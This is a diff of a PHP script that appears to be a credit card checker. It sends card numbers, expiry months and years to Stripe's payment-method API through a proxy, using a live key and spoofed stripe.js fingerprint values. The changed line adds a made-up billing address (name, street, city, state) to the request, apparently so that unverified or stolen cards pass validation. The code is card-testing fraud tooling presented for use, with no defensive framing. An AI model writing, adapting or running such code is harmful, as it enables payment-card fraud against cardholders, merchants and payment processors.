@@ -80,7 +80,7 @@ curl_setopt($ch, CURLOPT_PROXY, $proxy);
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_POST, 1);
-$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=Alice+Schuberg&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][postal_code]=94554&guid=e3180ce0-937d-41a5-a49b-34554202be6396cd52&muid=91670c3f-fc9d-417a-ad5b-55b56e3858e828a431&sid=f2b8e6cd-0795-4bcf-8439-b74dd87132b090531f&key='.$pklive.'&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540%3B+checkout';
+$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=Alice+Schuberg&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][line1]=5381+Smith+Rd&billing_details[address][city]=Cromwell&billing_details[address][postal_code]=94554&billing_details[address][state]=MN&guid=e3180ce0-937d-41a5-a49b-34554202be6396cd52&muid=91670c3f-fc9d-417a-ad5b-55b56e3858e828a431&sid=f2b8e6cd-0795-4bcf-8439-b74dd87132b090531f&key='.$pklive.'&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540%3B+checkout';
 
 $headers = array();
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
